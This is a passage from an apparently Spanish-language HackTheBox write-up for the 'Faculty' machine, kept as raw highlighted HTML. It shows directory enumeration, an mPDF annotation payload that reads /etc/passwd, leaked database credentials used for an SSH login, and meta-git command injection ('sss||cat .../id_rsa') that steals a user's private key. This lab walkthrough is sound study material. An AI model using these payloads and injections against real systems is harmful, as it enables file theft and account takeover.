&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/faculty ❯ feroxbuster -u http://faculty.htb/mpdf/ -x php,html,/ --silent
http://faculty.htb/mpdf/includes
http://faculty.htb/mpdf/tmp
http://faculty.htb/mpdf/config.php
http://faculty.htb/mpdf/classes
http://faculty.htb/mpdf/includes/functions.php
http://faculty.htb/mpdf/includes/out.php
http://faculty.htb/mpdf/font
http://faculty.htb/mpdf/classes/gif.php
http://faculty.htb/mpdf/graph.php
http://faculty.htb/mpdf/classes/barcode.php
http://faculty.htb/mpdf/classes/sea.php
http://faculty.htb/mpdf/patterns
http://faculty.htb/mpdf/patterns/en.php
http://faculty.htb/mpdf/patterns/de.php
http://faculty.htb/mpdf/patterns/es.php
http://faculty.htb/mpdf/patterns/ru.php
http://faculty.htb/mpdf/patterns/it.php
http://faculty.htb/mpdf/patterns/nl.php
http://faculty.htb/mpdf/patterns/fi.php
http://faculty.htb/mpdf/patterns/sv.php
http://faculty.htb/mpdf/qrcode
http://faculty.htb/mpdf/qrcode/data
http://faculty.htb/mpdf/qrcode/image.php
http://faculty.htb/mpdf/qrcode/index.php
http://faculty.htb/mpdf/classes/bmp.php
http://faculty.htb/mpdf/compress.php
http://faculty.htb/mpdf/classes/svg.php
^C
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
  &lt;/div&gt;
&lt;/div&gt;&lt;/p&gt;
&lt;p&gt;Encontramos algunos CVE (&lt;a href=&#34;https://www.cybersecurity-help.cz/vdb/SB2019020703&#34;&gt;CVE-2019-1000005&lt;/a&gt;, &lt;a href=&#34;https://www.dptech.com/index.php?m=content&amp;amp;c=index&amp;amp;a=show&amp;amp;catid=1691&amp;amp;id=1581&#34;&gt;CVE-2018-19047&lt;/a&gt;) relacionados a esta librería, unicamente logramos reproducir el SSRF utilizando el tag &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; entre otros, sin embargo no obtuvimos información de archivos o servicios locales.&lt;/p&gt;
&lt;p&gt;Investigando sobre esta librería y posibles vulnerabilidades encontramos un post sobre &lt;a href=&#34;https://medium.com/@jonathanbouman/local-file-inclusion-at-ikea-com-e695ed64d82f&#34;&gt;Local file inclusion at IKEA.com&lt;/a&gt; donde presenta una explotación LFI utilizando una etiqueta de &lt;a href=&#34;https://mpdf.github.io/reference/mpdf-functions/annotation.html&#34;&gt;anotación&lt;/a&gt; de mPDF para la lectura de archivos locales.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;annotation&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/etc/passwd&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;/etc/passwd&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;icon&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Graph&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;title&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;Attached File: /etc/passwd&amp;#34;&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;pos-x&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;195&amp;#34;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;/&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras enviar la anotación observamos que el pdf tiene un documento adjunto, al abrirlo se muestra el contenido del archivo /etc/passwd. Encontramos dos usuarios: gbyolo y developer.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/faculty/Screenshot_20220719_173020.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizando la lectura de distintos archivos php encontramos las credenciales de la conexión de base de datos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// db_connect.php
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; 

&lt;span class=&#34;nv&#34;&gt;$conn&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mysqli&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;sched&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Co.met06aci.dly53ro.per&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;scheduling_db&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;die&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Could not connect to mysql&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;mysqli_error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$con&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Utilizando una de las contraseñas y usuarios logramos ingresar por SSH.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/faculty ❯ ssh gbyolo@10.10.11.169 &lt;span class=&#34;c1&#34;&gt;# Co.met06aci.dly53ro.per&lt;/span&gt;
gbyolo@10.10.11.169&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password:
Welcome to Ubuntu 20.04.4 LTS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU/Linux 5.4.0-121-generic x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:36:44 CEST &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;

  System load:  0.01              Processes:             &lt;span class=&#34;m&#34;&gt;226&lt;/span&gt;
  Usage of /:   76.4% of 4.67GB   Users logged in:       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  Memory usage: 52%               IPv4 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: 10.10.11.169
  Swap usage:   0%


&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; updates can be applied immediately.


The list of available updates is more than a week old.
To check &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have mail.
Last login: Wed Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 00:00:12 &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; from 10.10.14.58
gbyolo@faculty:~$ whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
gbyolo
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gbyolo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gbyolo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;gbyolo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
/home/gbyolo
gbyolo@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;user---developer&#34;&gt;User - Developer&lt;/h1&gt;
&lt;p&gt;Al ingresar se muestra un mensaje de un correo, al revisar los correos, vemos que developer menciona que podemos administrar repositorios git.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gbyolo@faculty:~$ cat /var/mail/gbyolo
From developer@faculty.htb  Tue Nov &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; 15:03:02 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
Return-Path: &amp;lt;developer@faculty.htb&amp;gt;
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Postfix, from userid 1001&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
    id 0399E26125A&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Tue, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 15:03:02 +0100 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CET&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Subject: Faculty group
To: &amp;lt;gbyolo@faculty.htb&amp;gt;
X-Mailer: mail &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU Mailutils 3.7&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Message-Id: &amp;lt;20201110140302.0399E26125A@faculty.htb&amp;gt;
Date: Tue, &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; Nov &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; 15:03:02 +0100 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;CET&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
From: developer@faculty.htb
X-IMAPbase: &lt;span class=&#34;m&#34;&gt;1605016995&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
Status: O
X-UID: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you have troubles just &lt;span class=&#34;nb&#34;&gt;let&lt;/span&gt; me know!&lt;span class=&#34;se&#34;&gt;\n&lt;/span&gt;developer@faculty.htb

gbyolo@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;command-injection&#34;&gt;Command Injection&lt;/h2&gt;
&lt;p&gt;Observamos que el usario gbyolo puede ejecutar &lt;code&gt;meta-git&lt;/code&gt; como developer, seguramente a este comando se refería el correo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gbyolo@faculty:~$ sudo -l -l
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;sudo&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; password &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; gbyolo:
Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; gbyolo on faculty:
    env_reset, mail_badpass, &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/snap/bin

User gbyolo may run the following commands on faculty:

Sudoers entry:
    RunAsUsers: developer
    Commands:
    /usr/local/bin/meta-git
gbyolo@faculty:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Un &lt;a href=&#34;https://hackerone.com/reports/728040&#34;&gt;post&lt;/a&gt; de hackerone muestra que es posible inyectar comandos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;meta-git clone &lt;span class=&#34;s1&#34;&gt;&amp;#39;sss||touch HACKED&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Vemos que al reproducir la explotación se crea un archivo que pertenece a developer, por lo que podemos ejecutar comandos con este usuario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gbyolo@faculty:/tmp$ sudo -u developer meta-git clone &lt;span class=&#34;s1&#34;&gt;&amp;#39;sss||touch file_x&amp;#39;&lt;/span&gt; 2&amp;gt;/dev/null
meta git cloning into &lt;span class=&#34;s1&#34;&gt;&amp;#39;sss||touch file_x&amp;#39;&lt;/span&gt; at sss&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;touch file_x

sss&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;touch file_x:
sss&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;touch file_x ✓
gbyolo@faculty:/tmp$ ls -lah file_x
-rw-rw-r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; developer developer &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;20&lt;/span&gt; 01:44 file_x
gbyolo@faculty:/tmp$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Realizamos la lectura de la clave privada de developer, para luego ingresar por ssh utilizando esta.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;gbyolo@faculty:/dev/shm$ sudo -u developer meta-git clone &lt;span class=&#34;s1&#34;&gt;&amp;#39;sss||cat /home/developer/.ssh/id_rsa&amp;#39;&lt;/span&gt; 2&amp;gt;/dev/null
meta git cloning into &lt;span class=&#34;s1&#34;&gt;&amp;#39;sss||cat /home/developer/.ssh/id_rsa&amp;#39;&lt;/span&gt; at id_rsa

id_rsa:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;nv&#34;&gt;9u1fIdwzi56TWNhQAAABFkZXZlbG9wZXJAZmFjdWx0eQ&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;==&lt;/span&gt;
-----END OPENSSH PRIVATE KEY-----
gbyolo@faculty:/dev/shm$ nano id_rsa
